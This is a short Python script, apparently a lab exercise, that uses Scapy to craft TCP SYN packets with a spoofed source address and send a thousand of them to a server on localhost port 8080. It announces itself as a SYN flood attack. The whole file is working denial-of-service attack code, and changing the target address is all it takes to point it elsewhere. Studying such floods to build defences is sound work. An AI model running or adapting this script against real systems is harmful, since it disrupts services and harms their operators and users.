from scapy.all import *
from scapy.layers.inet import IP,TCP
# Target server address and port
server_ip = "127.0.0.1"
server_port = 8080
client_ip = "127.0.0.2"
client_port = 3000
# Number of SYN packets to flood
num_syn_packets = 1000

# Craft the SYN packet
syn_packet = IP(dst=server_ip, src = client_ip)/TCP(dport=server_port, flags="S")

# Send the SYN packets
send(syn_packet*num_syn_packets, verbose=False)

print("SYN flood attack completed.")